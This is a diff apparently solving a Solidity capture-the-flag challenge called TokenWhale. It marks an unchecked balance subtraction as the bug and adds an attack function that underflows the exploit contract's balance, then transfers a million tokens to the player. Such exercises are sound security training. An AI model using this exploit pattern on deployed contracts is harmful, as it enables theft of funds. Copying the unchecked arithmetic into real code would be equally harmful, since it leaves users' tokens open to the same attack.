@@ -26,6 +26,7 @@ contract TokenWhale {
 
     function _transfer(address to, uint256 value) internal {
         unchecked {
+            // that's the vulnerability, it will wrap
             balanceOf[msg.sender] -= value;
             balanceOf[to] += value;
         }
@@ -69,5 +70,9 @@ contract ExploitContract {
         tokenWhale = _tokenWhale;
     }
 
-    // write your exploit functions below
+    function attack(address player) public {
+        tokenWhale.transferFrom(player, player, 1000); // we already have 1000
+        tokenWhale.approve(address(this), 1_000_000); // that's the balance it got currently
+        tokenWhale.transferFrom(address(this), player, 1_000_000);
+    }
 }
